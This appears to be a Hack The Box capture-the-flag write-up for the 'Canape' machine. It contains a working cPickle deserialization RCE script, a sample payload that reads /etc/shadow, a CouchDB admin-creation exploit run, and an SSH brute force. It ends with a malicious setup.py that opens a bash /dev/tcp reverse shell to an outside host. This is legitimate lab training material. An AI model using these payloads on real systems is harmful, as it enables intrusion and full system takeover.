---
layout: single
title: Canape - Hack The Box
date: 2023-07-28
classes: wide
header:
  teaser: /assets/images/htb-writeup-canape/canape_logo.png
categories:
  - hackthebox
tags:
  - hackthebox
  - linux
  - python
  - couchdb
---


![](/assets/images/htb-writeup-canape/canape_logo.png)

### Summary
------------------
- There is a `.git/` directory exposed in the main webpage.
- There is a unserialize RCE vulnerability in `/check` route.
- Abusing `couchdb` vulnerability.
- Enumeration of `couchdb` gives the password for user `homer`.
- Bad sudo permissions make possible privilege escalation by using `pip`.

### Shell as www-data
------------------

### Nmap


```
Nmap scan report for 10.10.10.70
Host is up (0.036s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
65535/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Port 80 is an Apache Web service and port 65535 is the ssh service.

### Fuzzing Web service

Looks like the webpage uses some type of antifuzzing technology and sometimes responds with random lengths so you can not filter responses.    
Even adding super long delay time responds with random lengths.

```
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.70/
[+] Method:                  GET
[+] Threads:                 1
[+] Delay:                   3s
[+] Wordlist:                /opt/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] Exclude Length:          3076
[+] User Agent:              Opera/9.21 (Windows 98; U; en)
[+] Timeout:                 10s
===============================================================
2023/07/28 19:09:14 Starting gobuster in directory enumeration mode
===============================================================
/.bashrc              (Status: 200) [Size: 179]
/.cvs                 (Status: 200) [Size: 245]
/.cvsignore           (Status: 200) [Size: 204]
/.forward             (Status: 200) [Size: 130]
Progress: 7 / 4662 (0.15%)^C
[!] Keyboard interrupt detected, terminating.

===============================================================
2023/07/28 19:09:34 Finished
===============================================================
```

Some of the fake generated content responses look like this:

```
history ~ $ curl http://10.10.10.70/fake; echo
9DFJBLS2N2O9BOPY8J6QQXAK7H8R1UMA0ETMSVGJ0G8IQMWJBKWHXXJC89EHRR5NUSPTIVSJUA1WYFRKYZKSM5CUL121X5W000F68QHFBWF63096XL3XW1J2L37YCGOLMNC8SAQMR13GTE4YJ931TFSUWLPEUSKKSZZ8SBXVEGZO5NN6587DU8V5
history ~ $ curl http://10.10.10.70/fake; echo
C16H0300AP19A1SEF9S1OMTTWA3UDCI78WWAAW71MI3GT3KV4XRDZZEEZRSWH627FFCGWC9KWJK46YAARKZ26G4RJG767Q1YPBOOKX3UMO09GOPSJP2OY4MRCIP75IF3Y5IT7E1
```

I will make a simple python script to fuzz trough routes in a file, and the responses which contain no spaces (such as fake responses) will be repeated. 

```python
import requests
import threading
import sys

t = 0

def try_path(d):
    global t
    t += 1
    while True:
        response = requests.get(f"http://10.10.10.70/{d}")
        if " " in response.text:
            if len(response.text) != 3076:
                print("\b"*40+f"Discovered: {d}")
            t -= 1
            return

dirs = open(sys.argv[1],"rt").readlines()
total = len(dirs)
prog = 0
for d in dirs:
    print("\b"*40+f"[{prog}/{total}]",end="",flush=True)
    while t > 30: pass
    threading.Thread(target=try_path,args=(d.strip(),)).start()
    prog += 1
```

Now we run the script and wait for the results.

```
history ~ $ python3 fuzz.py /opt/wordlists/SecLists/Discovery/Web-Content/common.txt
Discovered: .git/HEAD
Discovered: cgi-bin/
Discovered: check
Discovered: quotes
Discovered: server-status
Discovered: static
Discovered: submit
[4660/4661]
```

We can see we discovered `.git/HEAD`.    
I will try to dump the `.git` directory with `git-dumper`.

```
[-] Testing http://10.10.10.70/.git/HEAD [200]
[-] Testing http://10.10.10.70/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://10.10.10.70/.git/ [200]
[-] Fetching http://10.10.10.70/.gitignore [200]
[-] http://10.10.10.70/.gitignore responded with HTML
[-] Fetching http://10.10.10.70/.git/logs/ [200]
[-] Fetching http://10.10.10.70/.git/HEAD [200]
[-] Fetching http://10.10.10.70/.git/hooks/ [200]
[-] Fetching http://10.10.10.70/.git/COMMIT_EDITMSG [200]
[-] Fetching http://10.10.10.70/.git/branches/ [200]
[-] Fetching http://10.10.10.70/.git/refs/ [200]
[-] Fetching http://10.10.10.70/.git/config [200]
[-] Fetching http://10.10.10.70/.git/index [200]
[-] Fetching http://10.10.10.70/.git/description [200]
[-] Fetching http://10.10.10.70/.git/info/ [200]
[-] Fetching http://10.10.10.70/.git/objects/ [200]
[-] Fetching http://10.10.10.70/.git/logs/HEAD [200]
[-] Fetching http://10.10.10.70/.git/refs/heads/ [200]
[-] Fetching http://10.10.10.70/.git/logs/refs/ [200]
[-] Fetching http://10.10.10.70/.git/refs/remotes/ [200]
[-] Fetching http://10.10.10.70/.git/hooks/commit-msg.sample [200]
[-] Fetching http://10.10.10.70/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://10.10.10.70/.git/refs/tags/ [200]
[-] Fetching http://10.10.10.70/.git/info/exclude [200]
[-] Fetching http://10.10.10.70/.git/hooks/post-update.sample [200]
[-] Fetching http://10.10.10.70/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://10.10.10.70/.git/hooks/pre-commit.sample [200]
[-] Fetching http://10.10.10.70/.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching http://10.10.10.70/.git/hooks/pre-rebase.sample [200]
[-] Fetching http://10.10.10.70/.git/hooks/pre-push.sample [200]
[-] Fetching http://10.10.10.70/.git/objects/0b/ [200]
[-] Fetching http://10.10.10.70/.git/objects/00/ [200]
[-] Fetching http://10.10.10.70/.git/hooks/update.sample [200]
[-] Fetching http://10.10.10.70/.git/objects/0f/ [200]
[-] Fetching http://10.10.10.70/.git/objects/3e/ [200]
[-] Fetching http://10.10.10.70/.git/objects/5a/ [200]
[-] Fetching http://10.10.10.70/.git/objects/5e/ [200]
[-] Fetching http://10.10.10.70/.git/objects/6c/ [200]
[-] Fetching http://10.10.10.70/.git/objects/6f/ [200]
[-] Fetching http://10.10.10.70/.git/objects/7a/ [200]
[-] Fetching http://10.10.10.70/.git/objects/7d/ [200]
[-] Fetching http://10.10.10.70/.git/objects/7b/ [200]
[-] Fetching http://10.10.10.70/.git/objects/8a/ [200]
[-] Fetching http://10.10.10.70/.git/objects/8f/ [200]
[-] Fetching http://10.10.10.70/.git/objects/36/ [200]
[-] Fetching http://10.10.10.70/.git/objects/35/ [200]
[-] Fetching http://10.10.10.70/.git/objects/40/ [200]
[-] Fetching http://10.10.10.70/.git/objects/44/ [200]
[-] Fetching http://10.10.10.70/.git/objects/52/ [200]
[-] Fetching http://10.10.10.70/.git/objects/64/ [200]
[-] Fetching http://10.10.10.70/.git/objects/70/ [200]
[-] Fetching http://10.10.10.70/.git/objects/60/ [200]
[-] Fetching http://10.10.10.70/.git/objects/87/ [200]
[-] Fetching http://10.10.10.70/.git/objects/89/ [200]
[-] Fetching http://10.10.10.70/.git/objects/86/ [200]
[-] Fetching http://10.10.10.70/.git/objects/92/ [200]
[-] Fetching http://10.10.10.70/.git/objects/a3/ [200]
[-] Fetching http://10.10.10.70/.git/objects/99/ [200]
[-] Fetching http://10.10.10.70/.git/objects/b0/ [200]
[-] Fetching http://10.10.10.70/.git/objects/a5/ [200]
[-] Fetching http://10.10.10.70/.git/objects/b2/ [200]
[-] Fetching http://10.10.10.70/.git/objects/a7/ [200]
[-] Fetching http://10.10.10.70/.git/objects/b8/ [200]
[-] Fetching http://10.10.10.70/.git/objects/c2/ [200]
[-] Fetching http://10.10.10.70/.git/objects/b4/ [200]
[-] Fetching http://10.10.10.70/.git/objects/bd/ [200]
[-] Fetching http://10.10.10.70/.git/objects/c8/ [200]
[-] Fetching http://10.10.10.70/.git/objects/ca/ [200]
[-] Fetching http://10.10.10.70/.git/objects/d3/ [200]
[-] Fetching http://10.10.10.70/.git/objects/d1/ [200]
[-] Fetching http://10.10.10.70/.git/objects/e6/ [200]
[-] Fetching http://10.10.10.70/.git/objects/df/ [200]
[-] Fetching http://10.10.10.70/.git/objects/f1/ [200]
[-] Fetching http://10.10.10.70/.git/objects/f4/ [200]
[-] Fetching http://10.10.10.70/.git/objects/e7/ [200]
[-] Fetching http://10.10.10.70/.git/objects/ed/ [200]
[-] Fetching http://10.10.10.70/.git/objects/f8/ [200]
[-] Fetching http://10.10.10.70/.git/objects/f9/ [200]
[-] Fetching http://10.10.10.70/.git/objects/info/ [200]
[-] Fetching http://10.10.10.70/.git/objects/fb/ [200]
[-] Fetching http://10.10.10.70/.git/refs/remotes/origin/ [200]
[-] Fetching http://10.10.10.70/.git/logs/refs/remotes/ [200]
[-] Fetching http://10.10.10.70/.git/objects/pack/ [200]
[-] Fetching http://10.10.10.70/.git/refs/heads/master [200]
[-] Fetching http://10.10.10.70/.git/logs/refs/heads/ [200]
[-] Fetching http://10.10.10.70/.git/objects/00/ef39e8883431948f6f69e59d5a9ea863a08e72 [200]
[-] Fetching http://10.10.10.70/.git/objects/5a/adab3835dbb632bdf86afedcbe98c8ae3868b6 [200]
[-] Fetching http://10.10.10.70/.git/objects/3e/f8376074e55faaaa9c7b13907f006f90041a75 [200]
[-] Fetching http://10.10.10.70/.git/objects/0b/93454801aa257c605d0b0aa8557bef99573aa2 [200]
[-] Fetching http://10.10.10.70/.git/objects/0f/3d606d14ac31acfeae864a3a64799bc971d202 [200]
[-] Fetching http://10.10.10.70/.git/objects/5e/2d65906b3450459ce47be9680386bc92baa1c9 [200]
[-] Fetching http://10.10.10.70/.git/objects/6f/5d3be3ee822324453528346f8081416baf7ef6 [200]
[-] Fetching http://10.10.10.70/.git/objects/6c/7e55a01273c8d67ebce4317c83d021de710b33 [200]
[-] Fetching http://10.10.10.70/.git/objects/7a/fc07d0820190e77d3b4062bcd2bd81d2aa9836 [200]
[-] Fetching http://10.10.10.70/.git/objects/7b/15317c5101ff1f45b31a28839360bd6c7b6c0b [200]
[-] Fetching http://10.10.10.70/.git/objects/7d/f5300b88aabe881068cf555633123d6f811892 [200]
[-] Fetching http://10.10.10.70/.git/objects/8a/22261e9aa0e94c97d90159e65a4fe505c8329b [200]
[-] Fetching http://10.10.10.70/.git/objects/8f/f4a29c06d1548800ab1d5a2a3cdca0c2d5a775 [200]
[-] Fetching http://10.10.10.70/.git/objects/36/acc974487bac2796f4d9a5a29b18c740658d01 [200]
[-] Fetching http://10.10.10.70/.git/objects/40/1a23875d407bd30a04b0974c6b6c519efe29b3 [200]
[-] Fetching http://10.10.10.70/.git/objects/35/b7eee94c101155ff2d9052e64c2022c3c39d76 [200]
[-] Fetching http://10.10.10.70/.git/objects/52/4f9ddcc74e10aba7256f91263c935c6dfb41e1 [200]
[-] Fetching http://10.10.10.70/.git/objects/44/710750bebce52f161e4c9720f253a96365f47a [200]
[-] Fetching http://10.10.10.70/.git/objects/64/ed42c4476f9eeec81ba5c90f5e2f8dc122af1e [200]
[-] Fetching http://10.10.10.70/.git/objects/70/9903c653c0d38384f7ca0a5718153f18ec2b34 [200]
[-] Fetching http://10.10.10.70/.git/objects/60/a8e44a37aad9dfb31a34df33051b038e5ce5b6 [200]
[-] Fetching http://10.10.10.70/.git/objects/92/eb5eb61f16b7b89be0a7ac0a6c2455d377bb41 [200]
[-] Fetching http://10.10.10.70/.git/objects/89/ba15888e8a047a45b61b7be64c5a0b9a59166c [200]
[-] Fetching http://10.10.10.70/.git/objects/87/d33f89ca48ac8739081a3eef1258ea0af525e7 [200]
[-] Fetching http://10.10.10.70/.git/objects/86/6c7f1fc8a97118fdfe8d4d9d97d5489da99ff8 [200]
[-] Fetching http://10.10.10.70/.git/objects/b2/24691eb4fb0f48d2cdbf8a9fef678da6dec5be [200]
[-] Fetching http://10.10.10.70/.git/objects/99/9b8699c0ccf9843ff98478e2dd364b680924e0 [200]
[-] Fetching http://10.10.10.70/.git/objects/b0/aa5f89568b2b0753f873a7c59ca2b784c2e600 [200]
[-] Fetching http://10.10.10.70/.git/objects/a3/89475a903520abba71a5c9b2fa0a15686c8fbb [200]
[-] Fetching http://10.10.10.70/.git/objects/a5/fce167233fe4d6484caec8e86d936e92196e50 [200]
[-] Fetching http://10.10.10.70/.git/objects/a7/3c17a0f0709cf6771324811a8a1b60d82b9e36 [200]
[-] Fetching http://10.10.10.70/.git/objects/a7/62ade84c321b26392139d726e60b2d5ccdbef1 [200]
[-] Fetching http://10.10.10.70/.git/objects/b8/27ee66ea380c2049f28e2e103721358a6029ff [200]
[-] Fetching http://10.10.10.70/.git/objects/b4/728ecfaa2d2a144cd93e2959fb0ce466f72eb8 [200]
[-] Fetching http://10.10.10.70/.git/objects/c2/40468c112a2341ebaac496239897c8fa76bd60 [200]
[-] Fetching http://10.10.10.70/.git/objects/c2/06ac7237df5809c1fd6c3467f0bfea9cdbb92a [200]
[-] Fetching http://10.10.10.70/.git/objects/bd/f07508589d95c5fd3d7f00ad8de8cba1f797a6 [200]
[-] Fetching http://10.10.10.70/.git/objects/c8/a74a098a60aaea1af98945bd707a7eab0ff4b0 [200]
[-] Fetching http://10.10.10.70/.git/objects/ca/a5b087768bcf286ecf290ba331cbeba8edb746 [200]
[-] Fetching http://10.10.10.70/.git/objects/ca/d28ce131bd0decb2ea0e076329e3b809bfc6e7 [200]
[-] Fetching http://10.10.10.70/.git/objects/d3/d09ec9bbf9bae622247aba997bc60a1f8db246 [200]
[-] Fetching http://10.10.10.70/.git/objects/d1/bebda21a7ef8443d038bd4cf238373be543fac [200]
[-] Fetching http://10.10.10.70/.git/objects/df/5ae3f08f84b5d7319c83c79987201f937ccb13 [200]
[-] Fetching http://10.10.10.70/.git/objects/e6/9de29bb2d1d6434b8b29ae775ad8c2e48c5391 [200]
[-] Fetching http://10.10.10.70/.git/objects/f4/c1d5c2fc501bda9d5dfcf04a84977844650fb0 [200]
[-] Fetching http://10.10.10.70/.git/objects/e7/bfbcf62cb61ca9f679d5fbfc82a491f580fccd [200]
[-] Fetching http://10.10.10.70/.git/objects/df/3037e77676265c2d888ff8acc16986453edde0 [200]
[-] Fetching http://10.10.10.70/.git/objects/f1/97cbfe1a46af74b09b09310baaca8fb4cd7f26 [200]
[-] Fetching http://10.10.10.70/.git/objects/ed/f353d8158614dff08903ba8437b16e60336ee8 [200]
[-] Fetching http://10.10.10.70/.git/objects/f8/97917e02c5a2c3a6346a212dcd4911adba5ad0 [200]
[-] Fetching http://10.10.10.70/.git/logs/refs/remotes/origin/ [200]
[-] Fetching http://10.10.10.70/.git/refs/remotes/origin/master [200]
[-] Fetching http://10.10.10.70/.git/objects/fb/798527bff76122c23ee473cd607436368db395 [200]
[-] Fetching http://10.10.10.70/.git/objects/f9/be9a9a7b217f67923ec22b360de313854b6ab6 [200]
[-] Fetching http://10.10.10.70/.git/logs/refs/heads/master [200]
[-] Fetching http://10.10.10.70/.git/logs/refs/remotes/origin/master [200]
[-] Running git checkout .
Updated 10 paths from the index
```

Now that we have this git project let's look at what it contains.

```
history ~ $ find loot/ | grep -v ".git"
loot/
loot/static
loot/static/css
loot/static/css/bootstrap.min.css.map
loot/static/css/bootstrap.min.css
loot/static/css/custom.css
loot/static/js
loot/static/js/bootstrap.min.js
loot/static/js/bootstrap.min.js.map
loot/__init__.py
loot/templates
loot/templates/quotes.html
loot/templates/submit.html
loot/templates/index.html
loot/templates/layout.html
```

We see that is a python application.    
Before we continue, we should look at the website first.    

![](/assets/images/htb-writeup-canape/web.png)

It looks like a Simpsons themed webpage were we can submit quotes and view them.    
Let's have a look at the source code of the web page.    

```python
import couchdb
import string
import random
import base64
import cPickle
from flask import Flask, render_template, request
from hashlib import md5


app = Flask(__name__)
app.config.update(
    DATABASE = "simpsons"
)
db = couchdb.Server("http://localhost:5984/")[app.config["DATABASE"]]

@app.errorhandler(404)
def page_not_found(e):
    if random.randrange(0, 2) > 0:
        return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(random.randrange(50, 250)))
    else:
	return render_template("index.html")

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/quotes")
def quotes():
    quotes = []
    for id in db:
        quotes.append({"title": db[id]["character"], "text": db[id]["quote"]})
    return render_template('quotes.html', entries=quotes)

WHITELIST = [
    "homer",
    "marge",
    "bart",
    "lisa",
    "maggie",
    "moe",
    "carl",
    "krusty"
]

@app.route("/submit", methods=["GET", "POST"])
def submit():
    error = None
    success = None

    if request.method == "POST":
        try:
            char = request.form["character"]
            quote = request.form["quote"]
            if not char or not quote:
                error = True
            elif not any(c.lower() in char.lower() for c in WHITELIST):
                error = True
            else:
                # TODO - Pickle into dictionary instead, `check` is ready
                p_id = md5(char + quote).hexdigest()
                outfile = open("/tmp/" + p_id + ".p", "wb")
		outfile.write(char + quote)
		outfile.close()
	        success = True
        except Exception as ex:
            error = True

    return render_template("submit.html", error=error, success=success)

@app.route("/check", methods=["POST"])
def check():
    path = "/tmp/" + request.form["id"] + ".p"
    data = open(path, "rb").read()

    if "p1" in data:
        item = cPickle.loads(data)
    else:
        item = data

    return "Still reviewing: " + item

if __name__ == "__main__":
    app.run()
```

So I can see that when I submit a quote, it is saved in `/tmp/{id}.p`    
Another thing that I see is the `/check` route.    
Apparently it reads the content of the quote file and then it loads it into `cPickle` if it contains the string "p1".

### RCE Strategy

The strategy I am going to follow here is to write a serialized payload into the quote file and then executing it with `/check`.    
One thing to take into account is that the quote is not saved as I send it, it is saved with the name of the character appended to it:

```python
...
            else:
                # TODO - Pickle into dictionary instead, `check` is ready
                p_id = md5(char + quote).hexdigest()
                outfile = open("/tmp/" + p_id + ".p", "wb")
		outfile.write(char + quote)
		outfile.close()
	        success = True
...
```

Searching a bit about absuing `cPickle` I found a [post](https://penturalabs.wordpress.com/2011/03/17/python-cpickle-allows-for-arbitrary-code-execution/) where it is using a preserialized payload so I don't have to.    
So a serialized payload would look like this:

```python
exploit = "cos\nsystem\n(S'cat /etc/shadow | head -n 5'\ntR.'\ntR."
```

Now that we have the payload, we need to know the quote id, which is the md5 hash of the `character + quote`.

```python
quote_id = md5(("moe"+quote).encode()).hexdigest()
```

Now, the serialize payload will not work because the character is appended to the quote, but if the character is in capital letters, `cPickle` will ignore it.    
Knowing this we will have to send the character with capital letters.

```python
response = requests.post("http://10.10.10.70/submit",data={"character":"MOE","quote":quote})
...
quote_id = md5(("MOE"+quote).encode()).hexdigest()
```

Finally I will add `# p1` at the end of the command so it loads it into `cPickle`.

```
...
cmd = base64.b64encode(cmd.encode()).decode()
payload = f"cos\nsystem\n(S'echo {cmd} | base64 -d | bash # p1'\ntR.'\ntR."
...
```

Now with all that we just post `/check` with the id of the quote and we should obtain RCE.    
I will leave my custom POC here:

```python
from hashlib import md5
import sys,requests,base64

print("""
 ██████████   ██████████   █████████   ██████████              ██████   ██████    ███████    ██████████
░░███░░░░███ ░░███░░░░░█  ███░░░░░███ ░░███░░░░███            ░░██████ ██████   ███░░░░░███ ░░███░░░░░█
 ░███   ░░███ ░███  █ ░  ░███    ░███  ░███   ░░███            ░███░█████░███  ███     ░░███ ░███  █ ░
 ░███    ░███ ░██████    ░███████████  ░███    ░███ ██████████ ░███░░███ ░███ ░███      ░███ ░██████
 ░███    ░███ ░███░░█    ░███░░░░░███  ░███    ░███░░░░░░░░░░  ░███ ░░░  ░███ ░███      ░███ ░███░░█
 ░███    ███  ░███ ░   █ ░███    ░███  ░███    ███             ░███      ░███ ░░███     ███  ░███ ░   █
 ██████████   ██████████ █████   █████ ██████████              █████     █████ ░░░███████░   ██████████
░░░░░░░░░░   ░░░░░░░░░░ ░░░░░   ░░░░░ ░░░░░░░░░░              ░░░░░     ░░░░░    ░░░░░░░    ░░░░░░░░░░

Blind RCE POC for the Canape HTB machine.
By s0ck37
""")

def send_payload(quote):
    response = requests.post("http://10.10.10.70/submit",data={"character":"MOE","quote":quote})
    print(f"[+] New quote created: {response.status_code}")

def trigger_exploit(qid):
    print(f"[+] Triggering exploit with quote id: {qid}")
    response = requests.post("http://10.10.10.70/check",data={"id":qid})
    print(f"[+] Exploit triggered: {response.status_code}")

def get_id(quote):
    quote_id = md5(("MOE"+quote).encode()).hexdigest()
    print(f"[+] New quote id: {quote_id}")
    return quote_id

cmd = sys.argv[1]
print(f"[+] Creating payload for command: '{cmd}'")
cmd = base64.b64encode(cmd.encode()).decode()
payload = f"cos\nsystem\n(S'echo {cmd} | base64 -d | bash # p1'\ntR.'\ntR."
print(f"[+] Serialized payload: {payload.encode()}")
send_payload(payload)
q_id = get_id(payload)
trigger_exploit(q_id)
```

We launch our exploit and obtain a reverse shell:

![](/assets/images/htb-writeup-canape/www-data.png)

### Shell as homer
------------------

When listing processes I see an interesting process being executed by `homer`:

```
homer       602  0.4  3.3 649340 33360 ?        Sl   09:44   0:19 /home/homer/bin/../erts-7.3/bin/beam -K true -A 16 -Bd -- -root /home/homer/bin/.. -progname couchdb -- -home /home/homer -- -boot /home/homer/bin/../releases/2.0.0/couchdb -name couchdb@localhost -setcookie monster -kernel error_logger silent -sasl sasl_error_logger false -noshell -noinput -config /home/homer/bin/../releases/2.0.0/sys.config
```

It looks like it is running `couchdb`, so like any other database server I will enumerate it:

```
www-data@canape:/$ curl -X GET http://localhost:5984/_all_dbs
["_global_changes","_metadata","_replicator","_users","passwords","simpsons"]
```

An interesting database named `passwords` pops up, but trying to enumerate it give access denied:

```
www-data@canape:/$ curl -X GET http://localhost:5984/passwords/_all_docs
{"error":"unauthorized","reason":"You are not authorized to access this db."}
```

Searching further I found that there is an [exploit](https://www.exploit-db.com/exploits/44498) for this `couchdb` version that lets you create a new admin account.    
I will copy it to the machine and run it.

```
www-data@canape:/tmp$ python2 exploit.py 127.0.0.1 -u s0ck37 -P s0ck37
[+] User to create: s0ck37
[+] Password: s0ck37
[+] Attacking host 127.0.0.1 on port 5984
[+] User s0ck37 with password s0ck37 successfully created.
```

Now that we have new credentials we can enumerate the `passwords` database:

```
www-data@canape:/tmp$ curl -X GET http://s0ck37:s0ck37@localhost:5984/passwords/_all_docs
{"total_rows":4,"offset":0,"rows":[
{"id":"739c5ebdf3f7a001bebb8fc4380019e4","key":"739c5ebdf3f7a001bebb8fc4380019e4","value":{"rev":"2-81cf17b971d9229c54be92eeee723296"}},
{"id":"739c5ebdf3f7a001bebb8fc43800368d","key":"739c5ebdf3f7a001bebb8fc43800368d","value":{"rev":"2-43f8db6aa3b51643c9a0e21cacd92c6e"}},
{"id":"739c5ebdf3f7a001bebb8fc438003e5f","key":"739c5ebdf3f7a001bebb8fc438003e5f","value":{"rev":"1-77cd0af093b96943ecb42c2e5358fe61"}},
{"id":"739c5ebdf3f7a001bebb8fc438004738","key":"739c5ebdf3f7a001bebb8fc438004738","value":{"rev":"1-49a20010e64044ee7571b8c1b902cf8c"}}
]}
```

Lets see what each id contains:

```
www-data@canape:/tmp$ curl -X GET http://s0ck37:s0ck37@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc4380019e4
{"_id":"739c5ebdf3f7a001bebb8fc4380019e4","_rev":"2-81cf17b971d9229c54be92eeee723296","item":"ssh","password":"0B4jyA0xtytZi7esBNGp","user":""}
```

So it looks like each id contains some credentials, I will copy all of them to a txt file and bruteforce the ssh with `hydra`.

```
history ~ $ cat passwords.txt
0B4jyA0xtytZi7esBNGp
r3lax0Nth3C0UCH
h02ddjdj2k2k2
STOP STORING YOUR PASSWORDS HERE -Admin
history ~ $ hydra -l homer -P passwords.txt ssh://10.10.10.70:65535
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-07-28 20:08:25
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 4 tasks per 1 server, overall 4 tasks, 4 login tries (l:1/p:4), ~1 try per task
[DATA] attacking ssh://10.10.10.70:65535/
[65535][ssh] host: 10.10.10.70   login: homer   password: 0B4jyA0xtytZi7esBNGp
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-07-28 20:08:28
```

So we can ssh as user `homer` with password `0B4jyA0xtytZi7esBNGp`.

### Shell as root
------------------

A basic `sudo -l` shows that we can run pip install as root.

```
homer@canape:/tmp$ sudo -l
[sudo] password for homer:
Matching Defaults entries for homer on canape:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User homer may run the following commands on canape:
    (root) /usr/bin/pip install *
```

We can create a setup.py and run `sudo pip install .`
This will execute the code in `setup.py`

```
homer@canape:/tmp/exploit$ echo -n "bash -i >& /dev/tcp/10.10.14.7/4343 0>&1" | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43LzQzNDMgMD4mMQ==
homer@canape:/tmp/exploit$ echo 'import os;os.system("echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43LzQzNDMgMD4mMQ== | base64 -d | bash")' > setup.py
```

And now we run `sudo pip install .` and we obtain a reverse shell as root:

![](/assets/images/htb-writeup-canape/root.png)
    
Cheers!
